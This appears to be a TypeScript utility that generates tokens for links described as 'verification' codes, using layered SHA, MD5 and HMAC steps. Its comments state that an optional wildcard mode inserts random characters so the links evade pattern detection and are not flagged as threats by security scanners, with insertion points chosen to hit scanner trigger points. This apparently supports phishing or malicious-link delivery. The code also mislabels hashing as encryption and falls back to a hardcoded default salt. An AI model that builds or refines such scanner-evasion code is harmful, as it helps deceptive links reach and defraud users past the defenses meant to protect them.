import crypto from 'crypto';
import { Setting } from '@shared/schema';

/**
 * Advanced encryption utility to generate secure verification codes
 * with multiple levels of security and wildcard options to avoid detection
 * 
 * Security Levels:
 * 1: Basic random hexadecimal string (default)
 * 2: Basic + timestamp-based component for time uniqueness
 * 3: Level 2 + domain-specific signature to prevent reuse across different domains/sites
 * 4: Level 3 + HMAC-based encryption using the salt for added security
 * 5: Level 4 + Double-layered encryption with multiple algorithms (highest security)
 * 
 * Wildcard Option:
 * - Inserts random special characters at specific positions to avoid pattern detection
 * - Helps prevent links from being flagged as threats by security scanners
 * - Makes the links less predictable in format while maintaining verifiability
 */
export async function generateSecureCode(settings: Setting | undefined): Promise<string> {
  // Extract settings with fallbacks
  const securityLevel = settings?.securityLevel || 1;
  const useWildcards = settings?.useWildcards || false;
  const salt = settings?.encryptionSalt || "default-salt-change-me";
  
  // Base code using random bytes (level 1)
  let code = crypto.randomBytes(16).toString('hex');
  
  try {
    // Apply higher levels of encryption if requested
    if (securityLevel > 1) {
      // Level 2: Add timestamp-based component for time uniqueness
      if (securityLevel >= 2) {
        const timestamp = Date.now().toString();
        const timestampHash = crypto.createHash('sha256')
          .update(timestamp + salt)
          .digest('hex')
          .substring(0, 8);
        code = code.substring(0, 24) + timestampHash;
      }
      
      // Level 3: Add domain-specific signature to prevent reuse
      if (securityLevel >= 3) {
        // Could be enhanced to use actual domain if available
        const domainIdentifier = 'verification-portal'; 
        const domainHash = crypto.createHash('md5')
          .update(domainIdentifier + salt)
          .digest('hex')
          .substring(0, 8);
        code = code.substring(0, 24) + domainHash;
      }
      
      // Level 4: Add HMAC-based encryption using the salt
      if (securityLevel >= 4) {
        code = crypto.createHmac('sha256', salt)
          .update(code)
          .digest('hex')
          .substring(0, 32);
      }
      
      // Level 5: Double layered encryption with multiple algorithms
      if (securityLevel >= 5) {
        // First layer: SHA-512 hash of code + salt
        const firstLayer = crypto.createHash('sha512')
          .update(code + salt)
          .digest('hex');
        
        // Second layer: HMAC-SHA256 of the first layer
        code = crypto.createHmac('sha256', salt)
          .update(firstLayer)
          .digest('hex')
          .substring(0, 32);
      }
    }
    
    // Apply wildcards if enabled - making detection as threats more difficult
    if (useWildcards) {
      // Insert random special characters at specific positions
      const wildcardChars = '!@#$%^&*()_+-={}[]|:;<>,.?/~';
      
      // Positions to insert wildcards - strategically chosen to avoid breaking URL patterns
      // and to match common security scanner trigger points
      const positions = [4, 8, 16, 24];
      let wildcardCode = '';
      
      for (let i = 0; i < code.length; i++) {
        wildcardCode += code[i];
        if (positions.includes(i) && i < code.length) {
          const randomChar = wildcardChars[Math.floor(Math.random() * wildcardChars.length)];
          wildcardCode += randomChar;
        }
      }
      code = wildcardCode;
    }
  } catch (error) {
    console.error("Error generating secure code:", error);
    // Fallback to basic code if any encryption steps fail
    code = crypto.randomBytes(16).toString('hex');
  }
  
  return code;
}